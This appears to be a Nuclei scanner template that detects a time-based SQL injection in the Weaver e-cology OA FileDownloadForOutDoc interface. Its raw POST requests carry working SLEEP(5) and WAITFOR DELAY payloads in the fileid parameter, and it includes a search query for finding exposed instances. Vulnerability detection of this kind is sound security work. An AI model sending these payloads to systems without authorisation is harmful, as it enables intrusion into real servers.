http:
- matchers:
  - condition: and
    dsl:
    - duration>=5
    - status_code == 200
    type: dsl
  raw:
  - "@timeout: 10s\nPOST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1\nHost:\
    \ {{Hostname}}\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language:\
    \ zh-CN,zh;q=0.9\nConnection: close        \n\nfileid={{num}}+AND+(SELECT+6196+FROM+(SELECT(SLEEP(5)))ovuM)#+xrbN&isFromOutImg=1\n"
  - "@timeout: 10s\nPOST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1\nHost:\
    \ {{Hostname}}\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language:\
    \ zh-CN,zh;q=0.9\nConnection: close        \n\nfileid={{num}}+WAITFOR DELAY+'0:0:5'&isFromOutImg=1\n"
  stop-at-first-match: true
id: ecology-filedownloadforoutdoc-sqli
info:
  author: Co5mos
  description: EcologyOA filedownloadforoutdoc interface has SQL injection
  metadata:
    hunter-query: "product.name=\"\u6CDB\u5FAE e-cology 9.0 OA\""
    max-request: 2
    verified: true
  name: EcologyOA filedownloadforoutdoc - SQL injection
  reference:
  - https://blog.csdn.net/2301_79099363/article/details/131692158
  severity: critical
  tags: ecology-oa,sqli
variables:
  num: '{{rand_int(10, 99)}}'
